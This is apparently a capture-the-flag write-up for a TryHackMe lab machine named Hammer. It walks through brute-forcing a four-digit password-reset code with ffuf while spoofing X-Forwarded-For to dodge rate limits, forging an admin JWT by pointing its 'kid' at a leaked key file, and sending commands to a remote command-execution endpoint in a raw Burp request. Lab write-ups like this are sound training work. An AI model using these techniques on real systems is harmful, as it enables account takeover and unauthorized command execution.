# ENUMERATION
---

## OPEN PORTS
---



![Pasted image 20241118152629.png](../../IMAGES/Pasted%20image%2020241118152629.png)


| PORT | STATE | SERVICE |
| :--- | :---- | :------ |
| 22 | open | ssh |
| 1337 | open | http |
| | | |
| | | |

We got two open ports, a ssh service and a http service is running in this machine, let's enumerate the website in order to gain access.

## FUZZING
---

![Pasted image 20241118155536.png](../../IMAGES/Pasted%20image%2020241118155536.png)

Two interesting directories, `/vendor` and `/phpmyadmin`, let's take a look at `/vendor` directory`

![Pasted image 20241118160002.png](../../IMAGES/Pasted%20image%2020241118160002.png)

Found three things, a `autoload.php` file, a `composer/` directory and a `firebase/` directory, but to be honest, nothing useful seems to come out of it, let's proceed with the reconnaissance 

# RECONNAISSANCE
---

Let's try the default credentials for this page and take a look at its behavior:

![Pasted image 20241118160317.png](../../IMAGES/Pasted%20image%2020241118160317.png)

Weren't lucky enough, let's inspect `storage` section and look for anything useful:

![Pasted image 20241118160351.png](../../IMAGES/Pasted%20image%2020241118160351.png)

Found a cookie value, it seems to be the following:

![Pasted image 20241118160408.png](../../IMAGES/Pasted%20image%2020241118160408.png)

`PHPSESSID: un57ni4plm0evo3h1augo6i799`


Now we know where to check for the cookie, let's take a look at the `Forgot your password?` section:

![Pasted image 20241118160522.png](../../IMAGES/Pasted%20image%2020241118160522.png)

Got redirected into a new section, `/reset_password.php` seems to be the one in charge of this part of the application, let's look at the main page source code in order to look up for the framework's name:

![Pasted image 20241118160656.png](../../IMAGES/Pasted%20image%2020241118160656.png)

Nice, now we know we need to bruteforce the directory in the following way, for this, I'll be using `ffuf`:

```ad-hint

# Command
---
`ffuf -u 'http://hammer.thm:1337/hmr_FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301 2>/dev/null`

# Output
---

```

We found 4 interesting directories, the one I like the most would be `logs` directory, let's take a look at it, for it, let's visit the following URL

`http://hammer.thm:1337/hmr_logs`


![Pasted image 20241118170617.png](../../IMAGES/Pasted%20image%2020241118170617.png)

Seems like we have a `error.logs` file, let's look inside:


```ad-note

# log
---
`[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
`

# Important Part:
---

Important part about the log would be the following email:

`tester@hammer.thm`


```

# EXPLOITATION
---

Now, here the exploitation part begins, let's try to reset the password for the email we found in the log:



![Pasted image 20241118171025.png](../../IMAGES/Pasted%20image%2020241118171025.png)

Once we send the request, this appears:

![Pasted image 20241118171056.png](../../IMAGES/Pasted%20image%2020241118171056.png)

We have a time of `180` seconds to enter the code, we can try to brute force it in the following way:

```ad-hint

# Steps to reproduce in order to get the code
----

1. Generating the sequence from 0000 to 9999 since we have a 4 digit code:
 `seq 0000 9999 >> codes.txt` 
2. Preparing our payload using `ffuf` in the following way (We need the PHPSESSID that we found previously):
	`ffuf -w codes.txt -u "http://hammer.thm:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=Cookie-ID" -H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s`

Breakdown of the code is available in the other note section.

3. Resetting the password.

# PoC
---



I resetted the pasword to 1234:


```


```ad-note
# Additional section
---
## Breakdown of the ffuf command
---

- `-w codes.txt`: Specifies the wordlist (codes.txt) that will be used for fuzzing. This wordlist contains the payloads that will replace the FUZZ keyword in the command.
- `-u "http://hammer.thm:1337/reset_password.php"`: The URL of the target web application. This is where the fuzzing request will be sent.
- `-X "POST"`: Specifies the HTTP method to be used, which in this case is POST.
- `-d "recovery_code=FUZZ&s=60"`: The data being sent in the body of the POST request. The FUZZ keyword here will be replaced with each entry from codes.txt during the fuzzing process. It appears that the fuzzing is targeting the recovery_code parameter.
- `-H "Cookie: PHPSESSID=Cookie-ID"`: Adds a custom header to the request, specifically a Cookie header with a session ID. This is likely needed to maintain a session with the web application.
- `-H "X-Forwarded-For: FUZZ"`: Adds another custom header, X-Forwarded-For, which is often used to identify the originating IP address of a client connecting to a web server. In this case, it's being fuzzed to see if the application behaves differently based on the IP address.
- `-H "Content-Type: application/x-www-form-urlencoded"`: Specifies the content type of the data being sent. This is typical for form submissions.
- `-fr "Invalid"`: Filters out responses that contain the string "Invalid". This helps in identifying successful or interesting responses that differ from the common invalid ones.
- `-s`: Runs ffuf in silent mode, which reduces the amount of output to only essential information.
```

Once we got in, we can proceed with privilege escalation.

# PRIVILEGE ESCALATION
---


Nice, we got access to the dashboard and we see something interesting, we can use commands, let's send a simple command like ls:

![Pasted image 20241118173721.png](../../IMAGES/Pasted%20image%2020241118173721.png)

We are able to perform the ls, and some interesting files were found, such as the `188ade1.key`, after some research in the page, I found this in the source code:

```ad-note

jwtToken:'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzMxOTY5NDIwLCJleHAiOjE3MzE5NzMwMjAsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.Xuc9SVWGWZqmISAx9rDzOXtFr1lSTGmueMqXhF_OBkU'

#### What's a JWT
----
A **JWT (JSON Web Token)** is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. It is typically used for **authentication** and **authorization** in web applications and APIs. A JWT is compact, URL-safe, and can be signed and optionally encrypted. It allows for secure communication between a client and a server
```

Issue seems to be that the page has a script section that logs us out after 20 seconds, so, there's few time to perform actions on the server, so, let's begin with decoding the token:

```ad-hint
#### Starting the decoding
----

For decoding this token I used this website: [URL](https://jwt.io/#debugger-io)


To finish the decoding, we need the 256 bit secret, which can be found in the `188ade1.key` file, let's get the secret:

We got the 256 bit secret, let's do the following:
1. Change the `kid` to the path we think the file is located at, in this case, `/var/www/html/188ade1.key`.
2. Change the `role` to `admin`
3. Enter the 256 bit secret
4. Get our new jwtToken and use `burp` to send a request with it, in order to perform higher privileged actions.

## Sending the burp request:

```

```r
POST /execute_command.php HTTP/1.1

Host: 10.10.176.51:1337

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json

Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzMxOTcwNzA3LCJleHAiOjE3MzE5NzQzMDcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.8eF5rLcT9OeSj4CZ_1NjKIsNEF54boyTSetZlnqQmQY

X-Requested-With: XMLHttpRequest

Content-Length: 16

Origin: http://10.10.176.51:1337

Connection: keep-alive

Referer: http://10.10.176.51:1337/dashboard.php

Cookie: PHPSESSID=cgvmui0ktgr6fuu1atg9jhrka6; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzMxOTcwNzA3LCJleHAiOjE3MzE5NzQzMDcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.8eF5rLcT9OeSj4CZ_1NjKIsNEF54boyTSetZlnqQmQY; persistentSession=no

Priority: u=0



{"command":"ls"}
```

```ad-hint

Let's change the token in the authorization section and command to read the contents of `/home/ubuntu/flag.txt`:


#### Response
----


We got our flag and finished the CTF.

`flag`: `THM{RUNANYCOMMAND1337}`
```


